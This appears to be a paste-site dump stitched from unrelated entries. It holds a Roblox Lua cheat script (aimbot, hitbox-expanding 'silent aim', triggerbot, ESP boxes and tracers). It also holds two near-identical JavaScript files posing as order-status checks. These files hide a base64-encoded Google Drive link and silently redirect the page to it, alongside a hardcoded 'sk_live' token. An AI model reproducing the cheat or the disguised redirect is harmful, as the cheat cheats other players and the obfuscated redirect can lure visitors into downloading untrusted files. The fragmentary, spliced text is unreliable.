local function getClosestEnemyPlayerToCrosshair()
    local mousePosition = UserInputService:GetMouseLocation()
    local closestPlayer = nil
    local closestDistance = math.huge
    local cameraPosition = Camera.CFrame.Position
    local cameraForward = Camera.CFrame.LookVector
    local centerOfScreen = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

    for _, player in pairs(Players:GetPlayers()) do
        -- Only target players who are on the enemy team
        if player ~= LocalPlayer and player.Character and isEnemyTeam(player) then
            -- Choose body part based on weighted probability
            local targetBodyPartName = getTargetBodyPart()
            local bodyPart = player.Character:FindFirstChild(targetBodyPartName)
            
            if bodyPart then
                local screenPosition, onScreen = Camera:WorldToViewportPoint(bodyPart.Position)

                if onScreen then
                    local playerPosition = bodyPart.Position - cameraPosition
                    local angle = math.acos(cameraForward:Dot(playerPosition.Unit)) * (180 / math.pi)

                    -- Check if the player is within the FOV
                    if angle <= FieldOfView / 2 then
                        -- Calculate screen distance (distance between mouse and player)
                        local screenDist = (Vector2.new(screenPosition.X, screenPosition.Y) - mousePosition).Magnitude
                        -- Calculate distance from the center of the screen, but apply the CenterPrioritizationFactor to shrink the circle
                        local distanceFromCenter = (Vector2.new(screenPosition.X, screenPosition.Y) - centerOfScreen).Magnitude * CenterPrioritizationFactor
                        -- Calculate the distance from the local player to the target player
                        local distanceToPlayer = (LocalPlayer.Character.Head.Position - bodyPart.Position).Magnitude

                        -- Combine these factors:
                        -- Prioritize players close to the center and those closer to the local player
                        local weightedScore = screenDist + distanceFromCenter + distanceToPlayer

                        -- Find the closest player based on the combined score
                        if weightedScore < closestDistance then
                            closestDistance = weightedScore
                            closestPlayer = {player = player, bodyPart = targetBodyPartName}
                        end
                    end
                end
            end
        end
    end

    return closestPlayer
end

-- Function to lock the camera onto the target player's body part
local function lockCameraOnPlayer(targetData)
    if targetData and targetData.player.Character then
        local bodyPart = targetData.player.Character:FindFirstChild(targetData.bodyPart)
        
        if bodyPart then
            LockedPlayer = targetData.player
            LastKnownPosition = bodyPart.Position

            RunService:BindToRenderStep(""LockCamera"", Enum.RenderPriority.Camera.Value, function()
                if LockedPlayer and LockedPlayer.Character and isEnemyTeam(LockedPlayer) then
                    local currentBodyPart = LockedPlayer.Character:FindFirstChild(targetData.bodyPart)
                    
                    if currentBodyPart then
                        local targetPosition = currentBodyPart.Position

                        -- Check if the player has moved more than 5 meters
                        if (targetPosition - LastKnownPosition).Magnitude > 5 then
                            -- Stop tracking if the player has teleported more than 5 meters
                            RunService:UnbindFromRenderStep(""LockCamera"")
                            LockedPlayer = nil
                            LastKnownPosition = nil
                            return
                        end

                        -- Update the last known position
                        LastKnownPosition = targetPosition

                        -- Lock the camera onto the player's body part
                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPosition)
                    else
                        RunService:UnbindFromRenderStep(""LockCamera"")
                        LockedPlayer = nil
                        LastKnownPosition = nil
                    end
                else
                    RunService:UnbindFromRenderStep(""LockCamera"")
                    LockedPlayer = nil
                    LastKnownPosition = nil
                end
            end)
        end
    end
end

-- Rayfield UI Toggle for Aimbot
local Toggle = AIMTab:CreateToggle({
    Name = ""🔫Aimbot🔫 (RCLICK)"",
    CurrentValue = false,
    Flag = ""AIM1"", -- A flag is the identifier for the configuration file
    Callback = function(Value)
        -- The function that takes place when the toggle is pressed
        AimbotEnabled = Value
        if not AimbotEnabled then
            -- Stop tracking if the aimbot is disabled
            RunService:UnbindFromRenderStep(""LockCamera"")
            LockedPlayer = nil
            LastKnownPosition = nil
        end
    end,
})

-- Detect right-click and lock onto the closest enemy player within FOV, only if Aimbot is enabled
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.UserInputType == Enum.UserInputType.MouseButton2 and AimbotEnabled then
        local closestPlayer = getClosestEnemyPlayerToCrosshair()
        lockCameraOnPlayer(closestPlayer)
    end
end)

-- Stop locking the camera when right-click is released
UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        RunService:UnbindFromRenderStep(""LockCamera"")
        LockedPlayer = nil
        LastKnownPosition = nil
    end
end)

-- This next part is for silent aim, you can modify the vectors to change how good the silent aim is
-- Function to get the Players service name dynamically
local function getPlayersName()
    for i, v in pairs(game:GetChildren()) do
        if v.ClassName == ""Players"" then
            return v.Name
        end
    end
end

local playersService = getPlayersName()
local localPlayer = game[playersService].LocalPlayer

-- Global variables to control the script
local isModificationEnabled = false
local modificationCoroutine = nil

-- Function to modify player character parts
local function modifyPlayerParts()
    while isModificationEnabled do
        for _, v in pairs(game[playersService]:GetPlayers()) do
            if v.Name ~= localPlayer.Name and v.Character then
                local parts = {
                    ""RightUpperLeg"", 
                    ""LeftUpperLeg"", 
                    ""HeadHB"", 
                    ""HumanoidRootPart""
                }
                
                for _, partName in ipairs(parts) do
                    local part = v.Character:FindFirstChild(partName)
                    if part then
                        part.CanCollide = false
                        part.Transparency = 10
                        part.Size = Vector3.new(10, 10, 10)
                    end
                end
            end
        end
        wait(1)  -- Wait for 1 second before next iteration
    end
    
    -- Reset parts when modification is disabled
    for _, v in pairs(game[playersService]:GetPlayers()) do
        if v.Name ~= localPlayer.Name and v.Character then
            local parts = {
                ""RightUpperLeg"", 
                ""LeftUpperLeg"", 
                ""HeadHB"", 
                ""HumanoidRootPart""
            }
            
            for _, partName in ipairs(parts) do
                local part = v.Character:FindFirstChild(partName)
                if part then
                    part.CanCollide = true
                    part.Transparency = 0
                    part.Size = Vector3.new(1, 1, 1)
                end
            end
        end
    end
end

-- Create Toggle for Player Part Modification
local Toggle = AIMTab:CreateToggle({
    Name = ""🔫silent aim🔫"",
    CurrentValue = false,
    Flag = ""PlayerPartModification"",
    Callback = function(Value)
        isModificationEnabled = Value
        
        if Value then
            -- Start the modification coroutine
            modificationCoroutine = coroutine.create(modifyPlayerParts)
            coroutine.resume(modificationCoroutine)
        else
            -- If the coroutine is running, it will exit due to isModificationEnabled being false
            modificationCoroutine = nil
        end
    end,
})


local Toggle = AIMTab:CreateToggle({
    Name = ""🔫TriggerBot🔫"",
    CurrentValue = false,
    Flag = ""EnemyAutoClickToggle"",
    Callback = function(Value)
        if Value then
            -- Activate auto-click
            getgenv().AutoClickConnection = game:GetService(""RunService"").RenderStepped:Connect(function()
                local Players = game:GetService(""Players"")
                local LocalPlayer = Players.LocalPlayer
                local Mouse = LocalPlayer:GetMouse()

                if Mouse.Target and Mouse.Target.Parent then
                    local TargetPlayer = Players:GetPlayerFromCharacter(Mouse.Target.Parent)
                    
                    if TargetPlayer and TargetPlayer ~= LocalPlayer then
                        if not TargetPlayer.Team or TargetPlayer.Team ~= LocalPlayer.Team then
                            mouse1press()
                            wait()
                            mouse1release()
                        end
                    end
                end
            end)
        else
            -- Deactivate auto-click
            if getgenv().AutoClickConnection then
                getgenv().AutoClickConnection:Disconnect()
            end
        end
    end
})

-- Services
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Variables for ESP
local espEnabled = false -- Tracks the ESP state
local espConnection -- Stores the RenderStepped connection for ESP updates

-- Variables for Tracers
local drawLinesEnabled = false
local lines = {} -- Store all the lines
local tracerConnection -- Stores the RenderStepped connection for tracers

-- Function to create a hollow rectangle with thicker borders (ESP box)
local function createHollowBox()
    local box = Instance.new(""BillboardGui"")
    box.Size = UDim2.new(4, 0, 5, 0)
    box.AlwaysOnTop = true
    box.Adornee = nil
    box.Name = ""PlayerBox""

    local borderThickness = 0.05 -- Increased from 0.03 to make borders thicker

    local top = Instance.new(""Frame"")
    top.Size = UDim2.new(1, 0, borderThickness, 0)
    top.Position = UDim2.new(0, 0, 0, 0)
    top.BackgroundColor3 = Color3.new(1, 0, 0)
    top.BorderSizePixel = 0
    top.Parent = box

    local bottom = Instance.new(""Frame"")
    bottom.Size = UDim2.new(1, 0, borderThickness, 0)
    bottom.Position = UDim2.new(0, 0, 1 - borderThickness, 0)
    bottom.BackgroundColor3 = Color3.new(1, 0, 0)
    bottom.BorderSizePixel = 0
    bottom.Parent = box

    local left = Instance.new(""Frame"")
    left.Size = UDim2.new(borderThickness, 0, 1, 0)
    left.Position = UDim2.new(0, 0, 0, 0)
    left.BackgroundColor3 = Color3.new(1, 0, 0)
    left.BorderSizePixel = 0
    left.Parent = box

    local right = Instance.new(""Frame"")
    right.Size = UDim2.new(borderThickness, 0, 1, 0)
    right.Position = UDim2.new(1 - borderThickness, 0, 0, 0)
    right.BackgroundColor3 = Color3.new(1, 0, 0)
    right.BorderSizePixel = 0
    right.Parent = box

    return box
end

-- Function to check if a player is on the enemy team
local function isEnemyTeam(player)
    return player.Team ~= LocalPlayer.Team
end

-- Function to highlight all enemy players (ESP)
local function highlightAllPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and isEnemyTeam(player) then
            if player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                if not player.Character:FindFirstChild(""PlayerBox"") then
                    local box = createHollowBox()
                    box.Adornee = player.Character:FindFirstChild(""HumanoidRootPart"")
                    box.Parent = player.Character
                end
            end
        else
            if player.Character and player.Character:FindFirstChild(""PlayerBox"") then
                player.Character.PlayerBox:Destroy()
            end
        end
    end
end

-- Clean up highlights when players leave
local function onPlayerRemoving(player)
    if player.Character and player.Character:FindFirstChild(""PlayerBox"") then
        player.Character.PlayerBox:Destroy()
    end
end

-- Enable or disable ESP
local function toggleESP(state)
    if state then
        espConnection = RunService.RenderStepped:Connect(highlightAllPlayers)
        Players.PlayerRemoving:Connect(onPlayerRemoving)
    else
        if espConnection then
            espConnection:Disconnect()
            espConnection = nil
        end
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild(""PlayerBox"") then
                player.Character.PlayerBox:Destroy()
            end
        end
    end
end

-- Function to create and update tracers (lines)
local function createLine()
    local line = Drawing.new(""Line"")
    line.Visible = true
    line.Thickness = 3 -- Increased from 1 to make lines thicker
    line.Color = Color3.new(1, 0, 0)
    return line
end

local function updateLines()
    -- Hide all lines first
    for _, line in ipairs(lines) do
        line.Visible = false
    end

    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local index = 1
    for _, player in ipairs(Players:GetPlayers()) do
        -- Only draw lines to enemy team players
        if player ~= LocalPlayer and isEnemyTeam(player) and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local character = player.Character
            local rootPart = character.HumanoidRootPart
            local worldPosition = rootPart.Position
            local screenPosition, onScreen = Camera:WorldToViewportPoint(worldPosition)

            if onScreen then
                local line = lines[index] or createLine()
                line.From = screenCenter
                line.To = Vector2.new(screenPosition.X, screenPosition.Y)
                line.Visible = true

                lines[index] = line
                index = index + 1
            end
        end
    end

    -- Hide remaining lines if there are no players to connect to
    for i = index, #lines do
        lines[i].Visible = false
    end
end

local function cleanupLines()
    -- Clean up the lines by making them invisible and removing them
    for _, line in ipairs(lines) do
        line.Visible = false
        line:Remove()
    end
    lines = {}
end

-- Toggle for tracers (line drawing)
local function toggleLineDrawing(state)
    if state then
        tracerConnection = RunService.RenderStepped:Connect(updateLines)
    else
        if tracerConnection then
            tracerConnection:Disconnect()
            tracerConnection = nil
        end
        cleanupLines()
    end
end

-- Rayfield UI Toggles

-- ESP Toggle
ESPTab:CreateToggle({
    Name = ""🔴Enemy Boxes🔴"",
    CurrentValue = false,
    Flag = ""BOX1"",
    Callback = function(Value)
        espEnabled = Value
        toggleESP(Value)
    end,
})

-- Tracers Toggle
ESPTab:CreateToggle({
    Name = ""🔴Tracer (Enemys)🔴"",
    CurrentValue = false,
    Flag = ""Tracer1"",
    Callback = function(Value)
        drawLinesEnabled = Value
        toggleLineDrawing(Value)
    end,
})
"
8sN2vMd3,Order.js,Epiphemeral,JavaScript,Monday 7th of April 2025 06:42:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68971/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
n8ZpiudD,Market.js,Epiphemeral,JavaScript,Monday 7th of April 2025 06:27:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62526/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
